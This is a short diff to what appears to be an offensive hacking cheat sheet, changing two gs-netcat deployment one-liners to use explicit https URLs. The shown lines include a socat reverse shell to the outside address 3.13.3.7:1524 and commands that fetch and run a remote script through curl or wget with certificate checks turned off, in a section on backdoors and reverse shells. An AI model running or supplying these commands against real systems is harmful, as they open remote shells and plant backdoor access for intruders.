@@ -1125,11 +1125,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
-bash -c "$(curl -fsSLk gsocket.io/x)"
+bash -c "$(curl -fsSLk https://gsocket.io/x)"
 ```
 or
 ```sh
-bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
 ```
 
 <a id="backdoor-background-reverse-shell"></a>
